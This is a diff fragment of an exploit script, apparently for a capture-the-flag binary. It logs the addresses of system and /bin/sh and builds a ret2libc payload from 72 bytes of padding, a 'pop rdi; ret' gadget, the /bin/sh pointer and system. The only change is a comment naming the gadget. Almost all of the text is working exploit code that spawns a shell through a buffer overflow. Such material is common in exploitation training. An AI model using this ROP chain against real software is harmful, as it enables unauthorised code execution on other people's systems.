@@ -42,7 +42,7 @@ log.info("system: %x" % system)
 log.info("/bin/sh: %x" % binsh)
 
 p = "A"*72
-p += p64(0x400a93)
+p += p64(0x400a93)    # pop rdi; ret
 p += p64(binsh)
 p += p64(system)
 
